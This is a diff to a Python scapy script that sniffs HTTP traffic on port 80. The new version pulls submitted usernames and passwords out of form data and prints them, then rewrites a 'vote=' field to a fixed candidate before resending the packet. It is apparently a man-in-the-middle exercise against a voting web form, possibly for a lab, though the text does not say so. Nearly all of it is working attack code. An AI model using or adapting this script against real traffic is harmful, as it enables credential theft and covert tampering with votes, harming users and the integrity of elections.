@@ -1,17 +1,38 @@
 from scapy.all import *
 
-load_layer("http")
+userField = 'user='
+passField = 'pass='
+voteField = 'vote='
+desiredVote = '2'
+
 
 def http_header(packet):
-        http_packet=str(packet)
-        if http_packet.find('POST'):
-                print(GET_print(packet))
-        print(packet)
-def GET_print(packet1):
-        print("***************************************GET PACKET****************************************************")
-        print("\n".join(packet1.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n")))
+    if Raw in packet:
+        data = packet[Raw].load.decode()
+        dataList = list(data)
 
-        print("*****************************************************************************************************")
+        if userField in str(packet[Raw].load):
+            index = data.find(userField)
+            endIndex = data.find('&', index, len(data) - 1)
+            scrapedUser = data[index + len(userField): endIndex]
+            print("Username is: " + scrapedUser)
+
+        if passField in str(packet[Raw].load):
+            index = data.find(passField)
+            endIndex = data.find('&', index, len(data) - 1)
+            scrapedPass = data[index + len(passField): endIndex]
+            print("Password is: " + scrapedPass)
+
+        if voteField in str(packet[Raw].load):
+            index = data.find(voteField)
+            print("Original vote was for candidate " + dataList[index + len(voteField)])
+            dataList[index + len(voteField)] = desiredVote
+            print("Changed vote to " + desiredVote)
+
+        data = "".join(dataList)
+        packet[Raw].load = data
+        print(packet.show())
+    send(packet)
 
 
-sniff(iface="Intel(R) I211 Gigabit Network Connection", prn = http_header, filter = "port 80")
+sniff(iface='\\Device\\NPF_Loopback', prn=http_header, filter="port 80")
